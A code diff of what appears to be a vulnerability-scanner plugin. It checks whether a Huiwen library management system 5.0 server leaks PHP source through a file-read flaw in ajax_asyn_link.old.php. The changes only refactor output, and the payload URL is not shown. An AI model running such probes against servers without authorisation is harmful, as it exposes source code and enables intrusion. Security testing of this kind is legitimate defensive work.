@@ -8,8 +8,8 @@ description: 漏洞影响5.0版本,漏洞文件位于ajax_asyn_link.old.php中,�
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class libsys_ajax_asyn_link_old_fileread_BaseVerify:
     def __init__(self, url):
@@ -22,12 +22,12 @@ class libsys_ajax_asyn_link_old_fileread_BaseVerify:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
             if r"<?php" in req.text:
-                cprint("[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = libsys_ajax_asyn_link_old_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
